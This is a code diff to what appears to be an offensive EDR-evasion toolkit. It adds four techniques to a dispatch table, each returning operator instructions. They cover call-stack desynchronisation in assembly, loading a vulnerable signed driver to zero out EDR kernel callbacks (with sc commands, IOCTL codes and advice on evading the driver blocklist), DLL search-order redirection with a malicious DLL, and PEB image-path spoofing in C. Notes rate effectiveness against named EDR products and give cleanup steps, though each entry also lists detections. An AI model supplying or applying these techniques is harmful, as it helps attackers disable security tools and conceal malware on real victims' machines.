@@ -70,6 +70,11 @@ SUPPORTED_TECHNIQUES = (
     "stack_spoof",
     "manual_map_header_erase",
     "function_level_encryption",
+    # v4.5 — advanced tradecraft
+    "call_stack_desync",
+    "byovd",
+    "dll_redirection",
+    "peb_imagepath_spoof",
 )
 
 
@@ -2049,6 +2054,234 @@ def _function_level_encryption(payload: str, obfuscate: bool) -> EvasionResult:
     )
 
 
+# ── v4.5 tradecraft ───────────────────────────────────────────────────────────
+
+def _call_stack_desync(payload: str, obfuscate: bool) -> EvasionResult:
+    src = (
+        "// Call-stack desynchronisation — combine indirect syscalls with deliberate\n"
+        "// CFG-invalid return addresses so the EDR's stack walker gets a corrupted view.\n"
+        "//\n"
+        "// Mechanism:\n"
+        "// 1. Before calling NtAllocateVirtualMemory (or any sensitive Nt*), push a\n"
+        "//    fabricated RIP onto the stack that points into the MIDDLE of a known-good\n"
+        "//    function (e.g., ntdll!RtlUserFiber+0x42). This frame is CFG-invalid but\n"
+        "//    appears legitimate to a naive frame-walk that just follows return addresses.\n"
+        "// 2. Execute the syscall via an indirect gadget (syscall;ret inside ntdll).\n"
+        "// 3. On return, pop the fabricated frame before continuing.\n"
+        "//\n"
+        "// Combined effect:\n"
+        "//   - The callstack during the syscall shows a CFG-inconsistent but\n"
+        "//     plausible-looking chain.\n"
+        "//   - EDR stack walkers following RIPs may land in unexpected functions and\n"
+        "//     misclassify the call origin.\n"
+        "//   - Combine with sleep-masking to prevent out-of-syscall memory scans.\n"
+        "//\n"
+        "// Skeleton (x64 asm):\n"
+        "//   push  <mid_function_gadget>   ; fabricated frame 1\n"
+        "//   push  <legit_ntdll_retaddr>   ; fabricated frame 2 (CFG-valid)\n"
+        "//   sub   rsp, 0x28               ; shadow space\n"
+        "//   mov   r10, rcx               ; NtAllocateVirtualMemory ABI\n"
+        "//   mov   eax, <ssn>              ; SSN resolved at runtime (SysWhispers3)\n"
+        "//   jmp   <syscall_gadget>        ; indirect: ntdll gadget issues syscall\n"
+        "//   ; --- on return: add rsp, 0x28 + pop 2 fabricated frames\n"
+        "//\n"
+        "// References: KlezVirus/SilentMoonwalk, Cobalt Strike 4.7 'cs-stack-spoof'\n"
+    )
+    return EvasionResult(
+        command=src,
+        technique="call_stack_desync",
+        notes=(
+            "Combines indirect syscalls with CFG-inconsistent fabricated frames. "
+            "The kernel-side callstack during the syscall looks legitimate to "
+            "basic stack walkers; CFG-aware EDRs may still flag the invalid "
+            "branch target. Most effective against CrowdStrike Falcon and "
+            "Defender for Endpoint callstack-inspection primitives."
+        ),
+        techniques=["T1106", "T1027", "T1620"],
+        risk="CRITICAL",
+        detections=[
+            "Syscall with return address chain containing mid-function offsets",
+            "CFG bitmap mismatch on indirect branch targets in user-mode",
+            "Kernel ETW: thread executing syscall with RSP in non-stack-committed region",
+            "EDR callstack heuristic: ntdll frame followed by non-ntdll frame at depth 1",
+        ],
+    )
+
+
+def _byovd(payload: str, obfuscate: bool) -> EvasionResult:
+    src = (
+        "// BYOVD — Bring Your Own Vulnerable Driver\n"
+        "//\n"
+        "// Phase 1: Load\n"
+        "//   Drop a known-vulnerable WHQL-signed driver to disk (e.g., RTCore64.sys,\n"
+        "//   dbutil_2_3.sys). Load it via:\n"
+        "//     sc create vuln_drv binPath=C:\\Windows\\Temp\\rtcore64.sys type=kernel\n"
+        "//     sc start vuln_drv\n"
+        "//   On systems with Vulnerable Driver Blocklist, pick a driver not yet\n"
+        "//   on the list (check: https://learn.microsoft.com/en-us/windows/security/\n"
+        "//   threat-protection/windows-defender-application-control/microsoft-recommended-driver-block-rules)\n"
+        "//\n"
+        "// Phase 2: Exploit (RTCore64 IOCTL example)\n"
+        "//   RTCore64 exposes IOCTL 0x70002025 (arbitrary kernel read) and\n"
+        "//                     0x70002029 (arbitrary kernel write).\n"
+        "//   hDev = CreateFile(\"\\\\.\\RTCore64\", GENERIC_READ|GENERIC_WRITE, ...)\n"
+        "//   Craft DeviceIoControl payload to walk PsLoadedModuleList,\n"
+        "//   locate target EDR kernel driver KernelBase, zero its callbacks.\n"
+        "//\n"
+        "// Phase 3: Disable EDR kernel callbacks\n"
+        "//   Targets: PsSetCreateProcessNotifyRoutine, PsSetLoadImageNotifyRoutine,\n"
+        "//            ObRegisterCallbacks (handle duplication interception)\n"
+        "//   Null out or NOP the registered EDR callback pointers directly in the\n"
+        "//   kernel callback array. EDR is blinded for new process/image events.\n"
+        "//\n"
+        "// Phase 4: Cleanup\n"
+        "//   sc stop vuln_drv && sc delete vuln_drv && del RTCore64.sys\n"
+        "//\n"
+        "// Tools: PPLKiller, KDMapper, EDRSandBlast, Backstab\n"
+        "//\n"
+        "// Notes: Requires local Administrator. Most EDRs load their kernel components\n"
+        "//        as PPL (Protected Process Light) — BYOVD can bypass PPL protection.\n"
+        "//        HVCI (Core Isolation) blocks loading unsigned or blocklisted drivers.\n"
+    )
+    return EvasionResult(
+        command=src,
+        technique="byovd",
+        notes=(
+            "Bring Your Own Vulnerable Driver. Loads a WHQL-signed but exploitable "
+            "kernel driver to gain ring-0 code execution and null-out EDR kernel "
+            "callbacks. Requires Administrator. HVCI (Core Isolation) blocks this "
+            "on modern Secured-Core PCs. Check the MS driver blocklist before "
+            "staging a specific driver."
+        ),
+        techniques=["T1068 - Exploitation for Privilege Escalation",
+                    "T1562.001 - Impair Defenses: Disable or Modify Tools",
+                    "T1014 - Rootkit"],
+        risk="CRITICAL",
+        detections=[
+            "sc.exe or NtLoadDriver loading a non-inbox driver binary",
+            "Sysmon Event 6 (driver loaded) with a non-Microsoft-signed driver",
+            "Windows Defender driver blocklist alert (Event 3067/3077)",
+            "Kernel callback array pointer zeroed (memory integrity check)",
+            "HVCI policy violation: unsigned driver load attempt",
+        ],
+    )
+
+
+def _dll_redirection(payload: str, obfuscate: bool) -> EvasionResult:
+    src = (
+        "// DLL Redirection via .local file and SxS manifest abuse\n"
+        "//\n"
+        "// Method A — .local redirection (legacy, XP+):\n"
+        "//   Create an empty file named <app>.exe.local beside the target EXE.\n"
+        "//   Windows loader now searches the application directory FIRST for any DLL\n"
+        "//   the EXE imports, before System32. Drop your malicious version.dll there.\n"
+        "//\n"
+        "//   cmd> copy NUL C:\\ProgramData\\SomeVendor\\app.exe.local\n"
+        "//   cmd> copy C:\\tools\\version_mal.dll C:\\ProgramData\\SomeVendor\\version.dll\n"
+        "//   cmd> C:\\ProgramData\\SomeVendor\\app.exe\n"
+        "//\n"
+        "//   Limitation: blocked when DevOverrideEnable=0 (default on Server 2016+).\n"
+        "//\n"
+        "// Method B — SxS (Side-by-Side) manifest redirect:\n"
+        "//   Craft an application manifest embedding a <dependency> for a known DLL:\n"
+        "//     <assemblyIdentity name='Microsoft.Windows.Common-Controls'\n"
+        "//       version='6.0.0.0' processorArchitecture='*' publicKeyToken='...' />\n"
+        "//   Place your malicious comctl32.dll in a folder alongside the EXE, named\n"
+        "//   per the assembly identity path. The Win32 SxS loader resolves your DLL.\n"
+        "//\n"
+        "// Method C — KnownDlls exclusion trick:\n"
+        "//   KnownDlls (e.g., ntdll.dll, kernel32.dll) are mapped from the kernel\n"
+        "//   object namespace and cannot be redirected. However, DLLs NOT in\n"
+        "//   KnownDlls (e.g., wbemdisp.dll, sfc.dll) can be dropped in the app dir.\n"
+        "//\n"
+        "// Execution:\n"
+        "//   The malicious DLL should proxy all legitimate exports to the real DLL\n"
+        "//   (same as DLL sideloading) and run your payload in DllMain.\n"
+    )
+    return EvasionResult(
+        command=src,
+        technique="dll_redirection",
+        notes=(
+            ".local redirection and SxS manifest abuse hijack the DLL search order "
+            "without touching System32 or PATH. The target executable is untouched "
+            "and retains its signature. Best on pre-2019 Windows or where "
+            "DevOverrideEnable is set. Combine with DLL proxying to avoid crashes. "
+            "SxS method is stealthier and works on modern Windows."
+        ),
+        techniques=["T1574.001 - Hijack Execution Flow: DLL Search Order Hijacking",
+                    "T1574.002 - Hijack Execution Flow: DLL Side-Loading"],
+        risk="HIGH",
+        detections=[
+            "File creation of <app>.exe.local beside a signed executable",
+            "DLL loaded from application directory matching a System32 DLL name",
+            "Sysmon Event 7: DLL image path in %APPDATA% or user-writable path",
+            "SxS activation context resolving to non-WinSxS cache path",
+        ],
+    )
+
+
+def _peb_imagepath_spoof(payload: str, obfuscate: bool) -> EvasionResult:
+    src = (
+        "// PEB ImagePathName spoofing — rewrite the process's own PEB to disguise\n"
+        "// its image path. EDR tools that enumerate processes via PEB (e.g.,\n"
+        "// Process Hacker, some AV products) see the spoofed name.\n"
+        "//\n"
+        "// The PEB (Process Environment Block) is readable/writable from user-mode.\n"
+        "// Fields of interest:\n"
+        "//   PEB.ImageBaseAddress          — pointer to the loaded PE (don't change)\n"
+        "//   PEB.ProcessParameters->ImagePathName  — UNICODE_STRING, operator target\n"
+        "//   PEB.ProcessParameters->CommandLine     — optional, also spoofable\n"
+        "//\n"
+        "// C skeleton:\n"
+        "//   #include <windows.h>\n"
+        "//   #include <winternl.h>\n"
+        "//\n"
+        "//   PPEB peb = (PPEB)__readgsqword(0x60);  // x64: GS:[0x60]\n"
+        "//   PRTL_USER_PROCESS_PARAMETERS pp = peb->ProcessParameters;\n"
+        "//\n"
+        "//   // Spoof ImagePathName to look like svchost.exe:\n"
+        "//   WCHAR fake[] = L\"C:\\\\Windows\\\\System32\\\\svchost.exe\";\n"
+        "//   UNICODE_STRING us;\n"
+        "//   us.Buffer = fake;\n"
+        "//   us.Length = (USHORT)(wcslen(fake) * 2);\n"
+        "//   us.MaximumLength = us.Length + 2;\n"
+        "//   pp->ImagePathName = us;\n"
+        "//\n"
+        "//   // Optional: also spoof CommandLine:\n"
+        "//   WCHAR fakeCmd[] = L\"C:\\\\Windows\\\\System32\\\\svchost.exe -k netsvcs\";\n"
+        "//   pp->CommandLine.Buffer = fakeCmd;\n"
+        "//   pp->CommandLine.Length = (USHORT)(wcslen(fakeCmd) * 2);\n"
+        "//\n"
+        "// Effect:\n"
+        "//   - NtQueryInformationProcess(ProcessBasicInformation) returns the spoofed\n"
+        "//     image path — used by Process Monitor, Process Hacker, many EDRs.\n"
+        "//   - GetModuleFileNameEx() and ReadProcessMemory of PEB will return spoof.\n"
+        "//   - Does NOT affect kernel-side image name (stored in EPROCESS.ImageFileName\n"
+        "//     and SeAuditProcessCreationInfo) — kernel-level tools see the real path.\n"
+    )
+    return EvasionResult(
+        command=src,
+        technique="peb_imagepath_spoof",
+        notes=(
+            "PEB ImagePathName spoofing rewrites the process's self-reported image "
+            "path in user-mode memory. Tools that enumerate processes via PEB "
+            "(Process Hacker, some AV agents) are deceived. The kernel-side "
+            "EPROCESS.ImageFileName is unchanged — EDRs with kernel drivers see "
+            "through this. Combine with PPID spoofing for a convincing parent "
+            "chain. Effective against userland-only process enumeration."
+        ),
+        techniques=["T1036.003 - Masquerading: Rename System Utilities",
+                    "T1055.012 - Process Injection: Process Hollowing"],
+        risk="HIGH",
+        detections=[
+            "NtQueryInformationProcess ImagePathName differs from kernel EPROCESS.ImageFileName",
+            "Sysmon Event 1 commandline mismatch vs PEB QueryInformationProcess",
+            "Memory scan: PEB->ProcessParameters->ImagePathName points outside module list",
+            "ETW: NtCreateUserProcess image path vs subsequent PEB content mismatch",
+        ],
+    )
+
+
 # ── Public API ─────────────────────────────────────────────────────────────────
 
 # Techniques that take (payload, obfuscate, lhost, lport).
@@ -2123,6 +2356,11 @@ _DISPATCH = {
     "stack_spoof": _stack_spoof,
     "manual_map_header_erase": _manual_map_header_erase,
     "function_level_encryption": _function_level_encryption,
+    # Advanced tradecraft (v4.5)
+    "call_stack_desync": _call_stack_desync,
+    "byovd": _byovd,
+    "dll_redirection": _dll_redirection,
+    "peb_imagepath_spoof": _peb_imagepath_spoof,
 }
 
 
